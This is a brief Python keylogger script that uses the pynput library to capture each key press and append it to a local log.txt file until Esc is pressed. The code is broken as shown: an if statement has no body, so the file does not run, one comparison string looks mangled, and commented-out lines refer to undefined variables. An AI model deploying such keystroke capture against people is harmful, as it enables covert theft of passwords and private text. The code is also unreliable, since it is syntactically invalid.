import pynput

from pynput.keyboard import Key, Listener

count = 0

def on_press(key):
    # keys.append(key)
    # count += 1
    #print("{0} is pressed".format(key))


    # if count >= 1:  # Increase the value if long sentences are to be written
    write_file(key)


def write_file(keys):
    keys = str(keys)
    keys = (keys).replace("'","")
    if keys == "Key.shift" or keys == "Key.shift_rKey":
    with open("log.txt","a") as file:
        file.write(keys)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()